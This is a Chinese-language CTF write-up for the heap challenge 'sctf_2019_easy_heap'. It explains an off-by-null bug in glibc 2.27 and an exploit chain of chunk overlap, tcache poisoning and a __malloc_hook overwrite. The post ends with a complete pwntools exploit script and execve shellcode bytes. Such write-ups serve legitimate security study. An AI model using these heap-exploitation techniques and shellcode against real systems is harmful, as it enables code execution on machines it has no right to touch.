# sctf_2019_easy_heap


### 总结
根据本题，学习与收获有：

- 根据[ctfwiki](https://ctf-wiki.org/pwn/linux/glibc-heap/chunk_extend_overlapping/#5extendoverlapping)中的前向合并技巧，当不存在一个存储`chunk`的堆地址的已知地址时，可以利用`main_arena+96`这个地址来进行`unlink`利用
- `unlink`利用时，要区分清楚是对哪一个`chunk`进行`unlink`
- `tcache bin`取用的时候，不会校验`size`域，只会判断`next`指针。所以，哪怕`size`被更改了，也不会引发异常。

<!-- more -->

### 题目分析

#### checksec

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416212818.png)

本题环境为`ubuntu 18`，`libc`版本为`2.27`。

#### 函数分析

##### main

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416212949.png)

可以看到，是个菜单题。首先看看`initial`中干了什么。

##### initial

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416213105.png)

- 调用`mmap`申请了一块内存，赋予的权限是`rwx`
- 打印出了刚刚申请到的内存的地址

##### menu

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210416213210251.png)

##### Allocate

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416213246.png)

流程为：

- 用户输入`size`，大小不超过`0x1000`
- 调用`malloc`分配内存，并将指针和大小信息存储在`ptr_array`数组中
- 打印出存放堆内存的`bss`段的地址

##### Delete

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416213448.png)

流程为：

- 输入`idx`
- 释放内存，并将`ptr_array`对应的信息清空

##### Fill

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416213545.png)

- 取出对应索引的`chunk`指针和大小
- 调用`read_off_by_null`写内存

所以需要看一下写数据的函数是啥样

##### read_off_by_null

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416213659.png)

很明显，会溢出一个字节，并将后面溢出的字节置为`null`。

#### 漏洞点

漏洞点有三个，分别是：

- `Fill`函数中，调用的是`read_off_by_null`，会溢出一个字节。注意到，题目使用的`libc`版本为`2.27`，因此，引入了`tcache`机制。只有当`chunk`的大小小于`0x410`的时候，才会把空闲的`chunk`放到`tcache bin`里面去，否则会先放到`unsorted bin`
- `mmap`申请了一块具有读写可执行的内存，并打印出了这块内存的地址
- 在`Allocate`函数中申请`chunk`的时候，会把`bss`段的地址打印出来，等于泄露出程序的基地址



### 利用思路

#### 知识点

- 前向合并`chunk`的时候，依托`unlink`机制，借助`main_arena + 96`这个地址，可以构造出`overlapped chunk`

#### 利用过程

步骤：

- 申请`5`块内存，分别为`Allocate(0x410)、Allocate(0x28)、Allocate(0x18)、Allocate(0x4f0)、Allocate(0x10)`，对应的索引为`0、1、2、3、4`
- 释放`chunk 0`，这个`chunk`会被放到`unsorted bin`里面去，`fd`与`bk`会被写为`main_arena + 96`
- 利用`off by null`，调用`Fill(2)`，将`chunk 3`的`presize`写为`0x470`，`chunk 3`的`size`被写为`0x500`。原来应该是`0x501`。
- `free(3)`，触发`unlink`，得到一个包裹了`chunk 0、1、2、3`的大`chunk`，这个大`chunk`的`size`为`0x970`
- 依次释放`chunk 1`和`chunk 2`，这时候`tcache bin[0x20]`和`tcache bin[0x30]`里面各有一个`freed chunk`
- 申请`chunk 5`，`Allocate(0x440)`，将释放的`chunk 1`包裹进来，并把`tcache bin[0x30]`这个地方的`chunk`的`fd`写为`main_arena + 96`
- 申请`chunk 6`， `Allocate(0x510)`，
- 编辑`chunk 5`，把`freed chunk 1`的`fd`改为`mmap`分配的那块内存的地址
- 编辑`chunk 6`，修改低一个字节为`0x30`，修改后`freed chunk 2`的`fd`指向的地址是`malloc_hook`
- 利用`tcache bin attack`，分别往`mmap`分配的内存上写`shellcode`，把`malloc_hook`修改为`mmap`内存的地址
- 调用`malloc`的时候，触发`shellcode`，获取到`shell`

### EXP

#### 调试过程

- 准备好函数和`shellcode`

  ```python
  def Allocate(size:int) -> int:
      sh.sendlineafter(">> ", "1")
      sh.sendlineafter("Size: ", str(size))
      sh.recvuntil("Pointer Address ")
      msg = sh.recvline()
      log.info("{}".format(msg))
      return int16(msg[:-1].decode())
  
  
  def Delete(idx:int):
      sh.sendlineafter(">> ", "2")
      sh.sendlineafter("Index: ", str(idx))
  
  
  def Fill(idx:int, content:(bytes, str)):
      sh.sendlineafter(">> ", "3")
      sh.sendlineafter("Index: ", str(idx))
      sh.sendafter("Content: ", content)
  
  shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
  ```

- 获取到`mmap`申请内存的地址，分配`5`次内存，并释放`chunk 0`

  ```python
  sh.recvuntil("Mmap: ")
  msg = sh.recvline()
  mmap_addr = int16(msg[:-1].decode())
  LOG_ADDR("mmap_addr", mmap_addr)
  
  program_base_addr = Allocate(0x410) - 0x202068 # 0
  LOG_ADDR("program_base_addr", program_base_addr)
  
  Allocate(0x28) # 1
  Allocate(0x18) # 2
  Allocate(0x4f0) # 3
  Allocate(0x10) # 4
  # 
  Delete(0)
  ```

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416220040.png)

- 编辑`chunk 2`，为`unlink`做准备

  ```python
  Fill(2, 0x10 * b'a' + p64(0x470))
  ```

  **编辑前**：

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416220203.png)

  **编辑后**

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416220244.png)

- 触发`unlink`

  ```python
  Delete(3)
  ```

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416220358.png)

- 释放`chunk 1、2`，并构造`overlapped chunk`

  ```python
  Delete(1)
  Delete(2)
  
  Allocate(0x440) # 0
  Allocate(0x510) # 1
  ```

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416220529.png)

- 利用`tcache bin attack`，分别写`shellcode`和更改`malloc_hook`内容

  ```python
  payload = b'a' * 0x410 + p64(0) + p64(0x31) + p64(mmap_addr + 0x10) 
  Fill(0, payload + b'\n')
  Allocate(0x28) # 2
  Allocate(0x28) # 3
  
  Fill(3, shellcode + b'\n')
  
  Fill(1, '\x30\n')
  Allocate(0x18) # 5
  Allocate(0x18) # 6
  
  Fill(6, p64(mmap_addr + 0x10) + b'\n')
  ```

  **修改前**：

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416220939.png)

  **修改后**：

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416221109.png)

- 调用`malloc`，触发`shellcode`

  ```python
  sh.sendlineafter(">> ", "1")
  sh.sendlineafter("Size: ", str(16))
  sh.interactive()
  ```

  ![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416221228.png)

打远程效果如下：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210416221806.png)

#### 完整exp

```python
from pwn import *

sh:tube = process("./sctf_2019_easy_heap")
LOG_ADDR = lambda x, y: log.success('{} ===> {}'.format(x, hex(y)))
int16 = functools.partial(int, base=16)

def Allocate(size:int) -> int:
    sh.sendlineafter(">> ", "1")
    sh.sendlineafter("Size: ", str(size))
    sh.recvuntil("Pointer Address ")
    msg = sh.recvline()
    log.info("{}".format(msg))
    return int16(msg[:-1].decode())


def Delete(idx:int):
    sh.sendlineafter(">> ", "2")
    sh.sendlineafter("Index: ", str(idx))


def Fill(idx:int, content:(bytes, str)):
    sh.sendlineafter(">> ", "3")
    sh.sendlineafter("Index: ", str(idx))
    sh.sendafter("Content: ", content)

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# 
sh.recvuntil("Mmap: ")
msg = sh.recvline()
mmap_addr = int16(msg[:-1].decode())
LOG_ADDR("mmap_addr", mmap_addr)

program_base_addr = Allocate(0x410) - 0x202068 # 0
LOG_ADDR("program_base_addr", program_base_addr)

Allocate(0x28) # 1
Allocate(0x18) # 2
Allocate(0x4f0) # 3
Allocate(0x10) # 4
# 
Delete(0)

Fill(2, 0x10 * b'a' + p64(0x470))

Delete(3)

Delete(1)
Delete(2)

Allocate(0x440) # 0

Allocate(0x510) # 1

payload = b'a' * 0x410 + p64(0) + p64(0x31) + p64(mmap_addr + 0x10) 
Fill(0, payload + b'\n')
Allocate(0x28) # 2
Allocate(0x28) # 3

Fill(3, shellcode + b'\n')

Fill(1, '\x30\n')
Allocate(0x18) # 5
Allocate(0x18) # 6

Fill(6, p64(mmap_addr + 0x10) + b'\n')

sh.sendlineafter(">> ", "1")
sh.sendlineafter("Size: ", str(16))

sh.interactive()
```

### 引用与参考
**My blog**: <https://roderickchan.github.io>
**ctfwiki**： <https://ctf-wiki.org/>

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-04-16-sctf-2019-easy-heap/  

